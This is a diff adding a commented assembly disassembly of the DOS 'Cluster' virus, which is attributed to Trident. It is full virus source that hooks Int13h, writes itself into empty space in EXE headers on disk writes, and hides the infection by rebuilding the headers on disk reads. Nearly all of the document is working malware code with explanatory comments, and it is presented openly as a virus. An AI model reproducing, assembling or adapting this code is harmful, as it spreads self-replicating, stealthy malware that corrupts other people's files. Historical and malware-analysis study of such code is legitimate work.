@@ -1,0 +1,222 @@
+;[Clust]      Clust                  89 1e 7c 01 2e 8c 06 7e 01 b4 0d
+;
+;
+; Disassembly of [Cluster] virus from Trident.
+;
+; This is a quick disassembly of the cluster virus from Trident. (TPE People)
+; It is a one-of-a-kind in that it infects EXE files without increasing their
+; size because it does so by looking for a big field of zeros inside of an
+; EXE's header. If it finds one it copies it's code there and the writes a
+; jump to it. It remains resident in memory and hooks only Int13h (infects on
+; disk writes) It is stealthy because it reconstructs EXE headers on a disk
+; reads showing the file as it was.
+;
+
+data_1e         equ     1
+data_2e		equ	28Fh
+data_3e		equ	0			;*
+data_4e		equ	3			;*
+data_5e		equ	12h			;*
+PSP_envirn_seg	equ	2Ch
+data_6e		equ	80h
+
+seg_a		segment	byte public
+		assume	cs:seg_a, ds:seg_a
+
+
+		org	100h
+
+clust		proc	far
+
+start:
+                jmp     short huh
+
+
+emptyspace       db 122 dup (90h)
+OldInt13h        dd 0
+
+
+huh:
+                jmp     install
+
+New_Int13h:
+                cmp     ah,3
+                je      disk_infect             ; If a Sector is being
+                                                ; written, check it out
+
+                cmp     ah,2
+                jne     exit_int13h
+
+                pushf
+                call    cs:oldint13h            ; Simulate an Int13h
+                jc      loc_ret_3               ; Jump if carry Set
+
+                cmp     word ptr es:[bx],7EEBh  ; Check Sector for Infection
+                jne     loc_ret_3
+
+                mov     word ptr es:[bx],5A4Dh  ; Put EXE Header Back
+		push	di
+		push	cx
+		push	ax
+		mov	cx,115h
+                xor     ax,ax
+		mov	di,bx
+		add	di,data_6e
+                rep     stosb                   ; Fill Space Back up w/Zeros
+		pop	ax
+		pop	cx
+		pop	di
+
+loc_ret_3:
+		iret				; Interrupt return
+
+exit_int13h:
+                jmp     cs:oldint13h
+
+disk_infect:
+                cmp     word ptr es:[bx],5A4Dh
+                jne     exit_int13h
+
+                cmp     word ptr es:[bx+4],75h  ; How Big is the File?
+                jae     exit_int13h             ; Too Big go home.
+
+                push    ax                      ; Save Registers
+		push	cx
+		push	si
+		push	di
+		push	ds
+		push	es
+		pop	ds
+		mov	si,bx
+		add	si,data_6e
+		mov	cx,115h
+
+scan_hole:
+                lodsb                           ; Load a Byte
+                cmp     al,0                    ; If It's Zero
+                loopz   scan_hole               ; Keep Going
+
+		cmp	cx,0
+                jne     restore_exit            ; No Enough Empty Space so
+                                                ; quit infect and perform
+                                                ; write
+
+		mov	di,bx
+                add     di,data_6e              ; Skip
+                mov     cx,115h                 ; Ammount to Write
+                mov     si,offset oldint13h     ; Starting At
+		push	cs
+		pop	ds
+                rep     movsb                   ; Move it Into Empty Space
+		mov	di,bx
+                mov     ax,7EEBh                ; Tag it as infected
+                stosw                           ; Store It to Disk
+
+restore_exit:
+		pop	ds
+		pop	di
+		pop	si
+		pop	cx
+		pop	ax
+                jmp     short exit_int13h       ; Perform the Write
+
+install:
+		mov	ax,3513h
+                int     21h                     ; Get Old Int13h
+
+                mov     word ptr cs:oldint13h,bx   ; Offset to Int13h
+                mov     word ptr cs:oldint13h+2,es ; Segment of Int13h
+
+                mov     ah,0Dh
+                int     21h                     ; Flush Disk Buffers
+
+                mov     ah,36h
+		mov	dl,0
+                int     21h                     ; Get Drive Info
+
+                mov     ax,cs
+		dec	ax
+                mov     ds,ax                   ; MCB
+                cmp     byte ptr ds:data_3e,5Ah ; Are We At The Last Chain?
+                jne     done                    ; If Not The Quit
+
+
+                sub     word ptr ds:data_4e,39h ; Subtract from MCB
+                sub     word ptr ds:data_5e,39h ; Subtract from PSP
+                mov     si,offset oldint13h     ; Point Back
+
+                mov     di,si
+                mov     es,ds:data_5e           ; ES Points to New Location
+		push	cs
+		pop	ds
+		mov	cx,115h
+                rep     movsb                   ; Copy Us Into Memory
+
+                mov     ax,2513h
+		push	es
+		pop	ds
+
+                mov     dx,offset new_int13h
+                int     21h                     ; Set Our New Int13h Handler
+
+                mov     ah,4Ah
+		push	cs
+		pop	es
+                mov     bx,39h                  ; How Many Paragraphs
+                int     21h                     ; Fix The Mem Allocation
+
+                push    cs
+		pop	ds
+                mov     bx,ds:PSP_envirn_seg    ; Get Enviornment Segment
+		mov	es,bx
+                xor     ax,ax
+		mov	di,data_1e
+
+getfname:
+		dec	di
+                scasw
+                jnz     getfname                ; Quest for File Name
+
+                lea     si,[di+2]
+		push	bx
+		pop	ds
+		push	cs
+		pop	es
+                mov     di,offset filename
+		push	di
+                xor     bx,bx
+
+get_char:
+                mov     cx,50h
+		inc	bx
+                lodsb                           ; Get a Char
+                cmp     al,0                    ; If It's noa Zero then
+                jne     store_char              ; Save It!
+                mov     al,0Dh                  ; Make a Return??
+store_char:
+                stosb
+                cmp     al,0Dh                  ; Look for our return
+                loopnz  get_char                ; to be sure we're done.
+
+
+		mov	ds:data_2e,bl
+		push	cs
+		pop	ds
+		pop	si
+		dec	si
+                int     2Eh                     ; Execute Fixed EXE File
+
+done:
+		mov	ah,4Ch
+                int     21h                     ; Terminate
+
+		db	0
+filename        db      1
+
+clust           endp
+
+seg_a		ends
+
+
+
+		end	start
